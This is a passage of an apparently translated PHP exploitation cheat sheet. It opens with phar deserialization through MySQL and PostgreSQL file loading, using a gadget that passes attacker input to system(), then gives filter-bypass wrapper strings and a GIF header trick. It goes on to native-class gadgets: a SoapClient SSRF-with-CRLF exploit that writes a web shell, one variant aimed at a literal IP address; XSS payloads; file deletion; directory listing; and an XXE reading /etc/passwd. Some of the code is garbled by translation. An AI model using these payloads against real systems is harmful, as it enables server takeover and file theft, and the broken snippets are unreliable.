	@$pdo->pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
?>
    
// Mysql
//LOAD DATA LOCAL INFILE will also trigger this php_stream_open_wrapper
//Configure mysqld:
//[mysqld]
//local-infile=1
//secure_file_priv=""
    
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m,
'localhost', 'root', 'root', 'testtable', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a LINES TERMINATED BY \'\r\n\' IGNORE 1 LINES;');
?>

```
## Bypass method

When the environment restricts the phar to appear in the previous characters, you can use compress.bzip2:// and compress.zlib:// to bypass it, etc.

```php
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar://test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
```

When the environment restricts the phar from appearing in the previous characters, it can also be used in conjunction with other protocols

```php
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

GIF format verification can be bypassed by adding GIF89a to the file header

```php
1. $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
2. Generate a phar.phar and modify the suffix name phar.gif
```
# PHP native class deserialization utilization

- If there are deserialization points in code audit, but no available classes are found in the original code, you can consider using some native classes in php
- Some classes may not be deserialized. Zend_class_unserialize_deny is used in php to prohibit deserialization of some classes
## SoapClient __call method for SSRF
**Precautions for use: **
- There is a soap extension required, and it is not enabled by default, it needs to be enabled manually
- Need to call a non-existent method to trigger its __call() function
- Only http/https protocol

What is **soap: **
- soap is one of the three elements of webServer (SOAP, WSDL, UDDI)
- WSDL is used to describe how to access specific interfaces
- UUDI is used to manage, distribute, and query webServer
- SOAP is the interface connecting web services and clients
- Simply put, SOAP is a simple XML-based protocol that allows applications to exchange information over HTTP

**soapClient class in php: **
The scapClient class in php can create soap data packets and interact with the wsdl interface.

```php
usage:

public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )

The first parameter is used to indicate whether it is WSDL mode
If null, it is non-wsdl mode. When deserializing, a soap request will be made to the url specified by the second parameter.

If the first parameter is null, the second parameter must set location and uri
  where location is the URL of the SOAP server to which the request is sent
  uri is the target namespace of SOAP service

The second parameter allows setting the user_agent option to set the requested user-agent header
```

 - Under normal circumstances, the SoapClient class calls a non-existent function and will call the __call method and issue a request
- The user_agent of the request packet issued by SoapClient is completely controllable. Combined with CRLF injection, a fully controllable POST request can be constructed, because the most critical Content-Length and Content-Type of the POST request are both under the user_agent
- If it is a GET request, it is much simpler. Just construct the location
- It should be noted that SoapClient will only make requests and will not receive responses

Example

```php
flag.php

<?php
if($_SERVER['REMOTE_ADDR']=='127.0.0.1'){
    eval($_POST['a']);
}
?>

index.php

<?php
$c=unserialize($_GET['a']);
$c->ss();
?>

exp.php

<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'a=file_put_contents("shell.php", "<?php phpinfo();?>");';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: aaaa=ssss'
);
$user_agent = 'aaa^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^^'.$post_string;
$options = array(
    'location' =$target,
    'user_agent'=$user_agent,
    'uri'="aaab"
);

$b = new SoapClient(null, $options);

$aaa = serialize($b);
$aaa = str_replace('^^', '%0d%0a', $aaa);
$aaa = str_replace('&', '%26', $aaa);
echo $aaa;

?>
```

```php
Common exp:
<?php
$target = 'http://123.206.216.198/bbb.php';
$post_string = 'a=b&flag=aaa';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
    );
$b = new SoapClient(null,array('location' =$target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^^'.$post_string,'uri' ="aaab"));
 
$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&','%26',$aaa);
echo $aaa;
?>
```

## __toString method for XSS

**Error Conditions of use: **
- php7 version
- In case of error report

```php
<?php
$a = new Error("<script>alert(1)</script>");
$b = serialize($a);
$b = urlencode($b); // Because there are invisible characters, url encode it
echo $b;

// test
echo unserialize(urldecode($b));
```

**Exception usage conditions: **
- Suitable for php5 and 7 versions
- In case of error report

```php
<?php
$a = new Exception("<script>alert(1)</script>");
$b = serialize($a);
$b = urlencode($b); // Because there are invisible characters, url encode it
echo $b;

// test
echo unserialize(urldecode($b));
```
## Instantiate any class

**ZipArchive::open Delete file: **
To call the object's quota open function, and the parameters in the open function are controllable

```php
$a = new ZipArchive();
$a->open('1.txt',ZipArchive::OVERWRITE);
// ZipArchive::OVERWRITE: Always start with a new compressed package, which will be overwritten if it already exists in this mode
// Because it is not saved, the effect is to delete 1.txt
```

**GlobIterator traversal directory: **
Traversal objects

```php
GlobIterator::__construct(string $pattern, [int $flag])
Iterate from constructing a new directory using $pattern
```

```php
Use Example

$newclass = new GlobIterator("./*.php",0);
foreach ($newclass as $key=>$value)
    echo $key.'=>'.$value.'<br>';
```

**SimpleXMLElement XXE:**
Used to represent elements in XML documents

```php
<?
php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY[
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x>&xxe;</x>
EOF;
$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);
var_dump($xml_class);
?>

The result is:
object(SimpleXMLElement)#1 (1) {
  [0]=>
  string(2393) "root:x:0:0:root:/root:/bin/bash
  ... ..."
}
```

**SQLite3 Create blank file: **
Prerequisite: There is a SQLite3 extension, and it is not enabled by default, it needs to be enabled manually

```php
<?php
$db = new SQLite3('a.txt');
?>
```

# Reference article
[Use session.upload_progress for deserialization attack](https://www.freebuf.com/vuls/202819.html)
[PHP native class deserialization utilization](https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#SoapClient-call%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8CSSRF)
[Content Reference 1](https://xz.aliyun.com/t/6753#toc-13)
[Content Reference 2](https://y4tacker.blog.csdn.net/article/details/113588692)